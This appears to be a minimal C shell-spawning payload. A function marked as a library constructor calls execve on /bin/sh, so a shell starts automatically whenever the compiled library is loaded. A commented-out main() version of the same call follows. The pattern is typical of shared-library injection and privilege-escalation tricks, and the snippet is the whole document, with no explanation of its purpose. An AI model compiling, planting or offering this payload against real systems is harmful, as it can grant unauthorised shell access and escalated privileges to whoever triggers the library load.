__attribute__((constructor)) main() {
    execve("/bin/sh", 0, 0);
}

// int main() {
//     execve("/bin/sh", 0, 0);
//     return 0;
// }